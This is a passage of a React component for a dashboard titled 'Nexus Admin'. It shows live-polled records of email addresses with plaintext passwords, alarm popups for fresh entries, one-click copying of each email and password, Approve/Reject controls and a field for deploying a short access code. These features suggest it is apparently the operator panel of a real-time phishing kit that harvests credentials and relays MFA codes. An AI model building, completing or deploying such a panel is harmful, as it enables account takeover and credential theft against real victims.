            <span>Live Access Queue</span>
          </a>
          <a href="#" className="nav-item">
            <i className="ri-history-line"></i>
            <span>Audit History</span>
          </a>
          <a href="#" className="nav-item">
            <i className="ri-settings-4-line"></i>
            <span>System Settings</span>
          </a>
        </nav>

        <div className="sidebar-footer">
          <button className="logout-btn" onClick={handleLogout}>
            <i className="ri-logout-box-r-line"></i>
            <span>Secure Logout</span>
          </button>
        </div>
      </aside>

      {/* MAIN WRAPPER */}
      <main className="main-wrapper">
        {/* Mobile Header */}
        <div className="mobile-header">
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <i className="ri-shield-flash-line" style={{ color: 'var(--accent-primary)', fontSize: '20px' }}></i>
            <h3 style={{ fontSize: '16px', fontWeight: 700 }}>Nexus Admin</h3>
          </div>
          <button className="mobile-toggle" onClick={() => setSidebarActive(!sidebarActive)}>
            <i className="ri-menu-3-line"></i>
          </button>
        </div>

        {/* Top Header Bar */}
        <div className="top-bar">
          <div className="page-title">
            <h1>Authentication Dashboard</h1>
            <p>Real-time user access verification & credential management</p>
          </div>

          <div className="top-actions">
            <button
              className={`icon-toggle-btn ${soundMuted ? 'muted' : ''}`}
              onClick={() => {
                setSoundMuted(!soundMuted);
                showToast(soundMuted ? 'Notification sound enabled' : 'Notification sound muted', soundMuted ? 'info' : 'warning');
              }}
              title={soundMuted ? 'Click to enable alarm sound' : 'Click to mute alarm sound'}
            >
              <i className={soundMuted ? 'ri-volume-mute-line' : 'ri-volume-up-line'}></i>
              <span>{soundMuted ? 'Sound Muted' : 'Sound On'}</span>
            </button>

            <div className="live-badge">
              <div className="pulse-dot"></div>
              <span>LIVE POLLING</span>
            </div>
          </div>
        </div>

        {/* Stats Grid */}
        <div className="stats-grid">
          <div className="stat-card">
            <div className="stat-info">
              <h3>Pending Verifications</h3>
              <div className="stat-value" style={{ color: verifyingUsers.length > 0 ? 'var(--accent-danger)' : 'var(--text-primary)' }}>
                {verifyingUsers.length}
              </div>
            </div>
            <div className="stat-icon pending">
              <i className="ri-alarm-warning-line"></i>
            </div>
          </div>

          <div className="stat-card">
            <div className="stat-info">
              <h3>Approved Access</h3>
              <div className="stat-value">{approvedCount}</div>
            </div>
            <div className="stat-icon approved">
              <i className="ri-checkbox-circle-line"></i>
            </div>
          </div>

          <div className="stat-card">
            <div className="stat-info">
              <h3>Total Recorded Logs</h3>
              <div className="stat-value">{users.length}</div>
            </div>
            <div className="stat-icon security">
              <i className="ri-database-2-line"></i>
            </div>
          </div>
        </div>

        {/* Coupon / Security Code Widget */}
        <div className="coupon-widget">
          <div className="coupon-details">
            <div className="coupon-badge-icon">
              <i className="ri-key-2-line"></i>
            </div>
            <div className="coupon-text">
              <h3>Security Access Code</h3>
              <p>
                Currently Active Code: <span className="active-code">{activeCoupon}</span>
              </p>
            </div>
          </div>

          <div className="coupon-form">
            <input
              type="text"
              className="coupon-input"
              placeholder="Code (e.g. 22)"
              maxLength={6}
              value={couponInput}
              onChange={(e) => setCouponInput(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && saveCoupon()}
            />
            <button className="btn-deploy" onClick={saveCoupon}>
              <i className="ri-send-plane-fill"></i> Deploy Code
            </button>
          </div>
        </div>

        {/* Controls Row: Tabs & Search */}
        <div className="controls-card">
          <div className="tab-group">
            <button
              className={`tab-btn ${activeTab === 'verifying' ? 'active' : ''}`}
              onClick={() => setActiveTab('verifying')}
            >
              <i className="ri-radar-line"></i>
              <span>Pending Action</span>
              <span className="tab-badge warning">{verifyingUsers.length}</span>
            </button>

            <button
              className={`tab-btn ${activeTab === 'history' ? 'active' : ''}`}
              onClick={() => setActiveTab('history')}
            >
              <i className="ri-history-line"></i>
              <span>Resolved History</span>
              <span className="tab-badge">{historyUsers.length}</span>
            </button>

            <button
              className={`tab-btn ${activeTab === 'all' ? 'active' : ''}`}
              onClick={() => setActiveTab('all')}
            >
              <i className="ri-list-check-2"></i>
              <span>All Logs</span>
              <span className="tab-badge">{users.length}</span>
            </button>
          </div>

          <div className="search-box">
            <i className="ri-search-line"></i>
            <input
              type="text"
              className="search-input"
              placeholder="Search email, password or ID..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
          </div>
        </div>

        {/* Table Container */}
        <div className="table-card">
          <div className="table-responsive">
            <table>
              <thead>
                <tr>
                  <th>Timestamp</th>
                  <th>ID</th>
                  <th>Email Address</th>
                  <th>Password Credential</th>
                  <th>Status</th>
                  <th style={{ textAlign: 'center' }}>Credentials Action</th>
                  <th style={{ textAlign: 'center' }}>Access Decision</th>
                </tr>
              </thead>
              <tbody>
                {displayedUsers.length === 0 ? (
                  <tr>
                    <td colSpan={7}>
                      <div className="empty-box">
                        <i className="ri-inbox-archive-line"></i>
                        <p>No user records found matching current filter.</p>
                      </div>
                    </td>
                  </tr>
                ) : (
                  displayedUsers.map((u) => {
                    const isUrgent = u.status === 'verifying' && u.seconds_ago < 60 && !acknowledgedUsers.includes(u.id);
                    const isCopied = acknowledgedUsers.includes(u.id);

                    return (
                      <tr key={u.id} className={isUrgent ? 'row-urgent' : ''}>
                        <td>
                          <span style={{ color: 'var(--text-secondary)', fontSize: '13px', fontWeight: 600 }}>
                            {formatTime(u.seconds_ago)}
                          </span>
                        </td>

                        <td>
                          <span style={{ color: 'var(--text-muted)', fontWeight: 700 }}>#{u.id}</span>
                        </td>

                        <td>
                          <strong style={{ color: 'var(--text-primary)', fontWeight: 600 }}>{u.email}</strong>
                        </td>

                        <td>
                          <span className="cred-code">{u.password}</span>
                        </td>

                        <td>
                          {u.status === 'verifying' && (
                            <span className="status-badge verifying">
                              <i className="ri-radar-line"></i> VERIFYING
                            </span>
                          )}
                          {u.status === 'approved' && (
                            <span className="status-badge approved">
                              <i className="ri-checkbox-circle-fill"></i> APPROVED
                            </span>
                          )}
                          {u.status === 'rejected' && (
                            <span className="status-badge rejected">
                              <i className="ri-close-circle-fill"></i> REJECTED
                            </span>
                          )}
                          {u.status !== 'verifying' && u.status !== 'approved' && u.status !== 'rejected' && (
                            <span className="status-badge copied">
                              <i className="ri-time-line"></i> {u.status}
                            </span>
                          )}
                        </td>

                        <td style={{ textAlign: 'center' }}>
                          <button
                            className="btn-action copy"
                            onClick={() => copyData(u.email, u.password, u.id)}
                            title="Copy Email & Password to Clipboard"
                          >
                            <i className={isCopied ? 'ri-check-line' : 'ri-file-copy-line'}></i>
                            <span>{isCopied ? 'Copied' : 'Copy'}</span>
                          </button>
                        </td>

                        <td style={{ textAlign: 'center' }}>
                          <div className="action-cell" style={{ justifyContent: 'center' }}>
                            <button
                              className="btn-action approve"
                              onClick={() => approveUser(u.id)}
                              title="Grant User Access"
                            >
                              <i className="ri-check-line"></i>
                              <span>Approve</span>
                            </button>

                            <button
                              className="btn-action reject"
                              onClick={() => rejectUser(u.id)}
                              title="Deny Access"
                            >
                              <i className="ri-close-line"></i>
                              <span>Reject</span>
                            </button>

                            <button
                              className="btn-icon-danger"
                              onClick={() => deleteUser(u.id)}
                              title="Delete Entry"
                            >
                              <i className="ri-delete-bin-line"></i>
                            </button>
                          </div>
                        </td>
                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>
        </div>
      </main>

      {/* Visual Verification Alert Popup Banner */}
      {activePopupUser && (
        <div className="verification-popup-banner">
          <div className="popup-header">
            <div className="popup-tag">
              <i className="ri-alarm-warning-fill" style={{ fontSize: '18px' }}></i>
              <span>Incoming Verification Request #{activePopupUser.id}</span>
            </div>
            <span style={{ fontSize: '12px', color: 'var(--text-muted)', fontWeight: 600 }}>
              {formatTime(activePopupUser.seconds_ago)}
            </span>
          </div>

          <div className="popup-body">
            <div className="popup-email">{activePopupUser.email}</div>
            <div className="popup-password">{activePopupUser.password}</div>
          </div>

          <div className="popup-actions">
            <button
              className="btn-popup-copy"
              onClick={() => copyData(activePopupUser.email, activePopupUser.password, activePopupUser.id)}
            >
              <i className="ri-file-copy-line"></i> Copy & Silence (Double-Space)
            </button>
            <button
              className="btn-action approve"
              onClick={() => approveUser(activePopupUser.id)}
            >
              <i className="ri-check-line"></i> Approve
            </button>
          </div>
        </div>
      )}

      {/* Floating Toast Notification */}
      {toastMsg && (
        <div className="toast-container">
          <div className={`toast-item ${toastMsg.type || 'info'}`}>
            <i
              className={
                toastMsg.type === 'success'
                  ? 'ri-checkbox-circle-fill'
                  : toastMsg.type === 'danger'
                  ? 'ri-error-warning-fill'
                  : toastMsg.type === 'warning'
                  ? 'ri-alert-fill'
                  : 'ri-information-fill'
              }
            ></i>
            <span>{toastMsg.msg}</span>
          </div>
        </div>
      )}
    </div>
  );
}
